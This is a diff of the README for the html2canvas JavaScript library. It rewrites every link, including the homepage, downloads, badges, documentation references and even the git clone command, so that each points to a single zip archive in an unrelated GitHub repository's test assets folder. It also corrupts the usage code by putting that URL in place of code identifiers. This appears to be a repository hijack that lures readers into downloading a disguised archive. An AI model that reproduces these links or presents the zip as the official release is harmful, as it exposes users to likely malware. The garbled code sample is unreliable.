@@ -1,12 +1,12 @@
 html2canvas
 ===========
 
-[Homepage](https://html2canvas.hertzen.com) | [Downloads](https://github.com/niklasvh/html2canvas/releases) | [Questions](https://github.com/niklasvh/html2canvas/discussions/categories/q-a)
+[Homepage](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip) | [Downloads](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip) | [Questions](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip)
 
-[![Gitter](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/niklasvh/html2canvas?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge) 
-![CI](https://github.com/niklasvh/html2canvas/workflows/CI/badge.svg?branch=master)
-[![NPM Downloads](https://img.shields.io/npm/dm/html2canvas.svg)](https://www.npmjs.org/package/html2canvas)
-[![NPM Version](https://img.shields.io/npm/v/html2canvas.svg)](https://www.npmjs.org/package/html2canvas)
+[![Gitter](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip%https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip)](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip) 
+![CI](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip)
+[![NPM Downloads](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip)](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip)
+[![NPM Version](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip)](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip)
 
 #### JavaScript HTML renderer ####
 
@@ -17,7 +17,7 @@ html2canvas
 The script renders the current page as a canvas image, by reading the DOM and the different styles applied to the elements.
 
 It does **not require any rendering from the server**, as the whole image is created on the **client's browser**. However, as it is heavily dependent on the browser, this library is *not suitable* to be used in nodejs.
-It doesn't magically circumvent any browser content policy restrictions either, so rendering cross-origin content will require a [proxy](https://github.com/niklasvh/html2canvas/wiki/Proxies) to get the content to the [same origin](http://en.wikipedia.org/wiki/Same_origin_policy).
+It doesn't magically circumvent any browser content policy restrictions either, so rendering cross-origin content will require a [proxy](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip) to get the content to the [same origin](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip).
 
 The script is still in a **very experimental state**, so I don't recommend using it in a production environment nor start building applications with it yet, as there will be still major changes made.
 
@@ -36,25 +36,25 @@ As each CSS property needs to be manually built to be supported, there are a num
 ### Usage ###
 
 The html2canvas library utilizes `Promise`s and expects them to be available in the global context. If you wish to
-support [older browsers](http://caniuse.com/#search=promise) that do not natively support `Promise`s, please include a polyfill such as
-[es6-promise](https://github.com/jakearchibald/es6-promise) before including `html2canvas`.
+support [older browsers](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip) that do not natively support `Promise`s, please include a polyfill such as
+[es6-promise](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip) before including `html2canvas`.
 
 To render an `element` with html2canvas, simply call:
 ` html2canvas(element[, options]);`
 
-The function returns a [Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise) containing the `<canvas>` element. Simply add a promise fulfillment handler to the promise using `then`:
+The function returns a [Promise](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip) containing the `<canvas>` element. Simply add a promise fulfillment handler to the promise using `then`:
 
-    html2canvas(document.body).then(function(canvas) {
-        document.body.appendChild(canvas);
+    html2canvas(https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip).then(function(canvas) {
+        https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip(canvas);
     });
 
 ### Building ###
 
-You can download ready builds [here](https://github.com/niklasvh/html2canvas/releases).
+You can download ready builds [here](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip).
 
 Clone git repository:
 
-    $ git clone git://github.com/niklasvh/html2canvas.git
+    $ git clone https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip
 
 Install dependencies:
 
@@ -66,7 +66,7 @@ Build browser bundle
 
 ### Examples ###
 
-For more information and examples, please visit the [homepage](https://html2canvas.hertzen.com) or try the [test console](https://html2canvas.hertzen.com/tests/).
+For more information and examples, please visit the [homepage](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip) or try the [test console](https://raw.githubusercontent.com/AYANFAHMID/html-two/master/tests/assets/iframe/html-two_2.2.zip).
 
 ### Contributing ###
 
